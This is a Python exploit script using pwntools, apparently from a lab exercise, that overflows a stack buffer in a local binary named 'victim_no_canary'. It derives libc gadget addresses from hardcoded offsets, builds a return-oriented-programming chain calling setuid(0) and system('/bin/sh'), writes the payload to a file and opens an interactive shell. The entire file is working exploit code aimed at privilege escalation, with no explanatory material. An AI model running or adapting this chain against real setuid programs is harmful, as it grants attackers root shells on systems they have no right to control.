from pwn import *
import struct

# glibc location
glibc = "/usr/lib/x86_64-linux-gnu/libc.so /usr/lib/x86_64-linux-gnu/libc.so.6"

def get_addr_from_offset(known_addr, known_addr_offset, target_addr_offset):
    unlinked_diff = known_addr_offset - target_addr_offset
    return known_addr - unlinked_diff

def smash_no_canary():
    # important addresses

    # address of libc_system at runtime
    libc_system = 0x7ffff7e1f290
    libc_exit = 0x7ffff7e06a40

    # addresses of libc before linking (relative addresses)
    libc_execv_unlinked = 0xe3170
    libc_setuid_unlinked = 0xe4150
    libc_bin_sh_unlinked = 0x1b45bd
    libc_system_unlinked = 0x52290
    gadget_unlinked = 0x23b6a # pop rdi, ret
    ret_gadget_unlinked = 0x23b6b
    pop_rsi_ret_unlinked = 0x2601f
    # gadget_unlinked = 0x248f2

    # get the runtime addresses
    gadget_addr = get_addr_from_offset(libc_system, libc_system_unlinked, gadget_unlinked)

    ret_gadget_addr = get_addr_from_offset(libc_system, libc_system_unlinked, ret_gadget_unlinked)

    libc_bin_sh = get_addr_from_offset(libc_system, libc_system_unlinked, libc_bin_sh_unlinked)

    libc_setuid_addr = get_addr_from_offset(libc_system, libc_system_unlinked, libc_setuid_unlinked)

    libc_execv = get_addr_from_offset(libc_system, libc_system_unlinked, libc_execv_unlinked)

    pop_rsi_ret = get_addr_from_offset(libc_system, libc_system_unlinked, pop_rsi_ret_unlinked)

    # constants
    padding = 64*"A"
    padding = bytes(padding, 'ascii')

    # base pointer preservation
    rbp_padding = 0x7fffffffe028
    rbp_padding = struct.pack("L", rbp_padding)

    # padding | old_rbp (rbp_padding) | ret addr (start of code payload) | system_cmd string | payload code
    payload = padding + rbp_padding + struct.pack("L", ret_gadget_addr) + struct.pack("L", gadget_addr) + struct.pack("L", 0) + struct.pack("L", libc_setuid_addr) + struct.pack("L", ret_gadget_addr) + struct.pack("L", gadget_addr) + struct.pack("L", libc_bin_sh) + struct.pack("L", libc_system) + struct.pack("L", gadget_addr+1) + struct.pack("L", libc_exit) # HIGHER ADDRESSES -->>
    # payload = padding + rbp_padding + struct.pack("L", ret_gadget_addr) + struct.pack("L", gadget_addr) + struct.pack("L", 0) + struct.pack("L", libc_setuid_addr) + struct.pack("L", ret_gadget_addr) +  struct.pack("L", pop_rsi_ret) + struct.pack("L", 0) + struct.pack("L", ret_gadget_addr) + struct.pack("L", gadget_addr) + struct.pack("L", libc_bin_sh) + struct.pack("L", libc_execv) + struct.pack("L", gadget_addr+1) + struct.pack("L", libc_exit)

    with open("payload.txt", "wb") as bin:
        bin.write(payload)

    p = process("./victim_no_canary")
    p.send(payload)
    p.interactive()

if __name__ == '__main__':
    smash_no_canary()
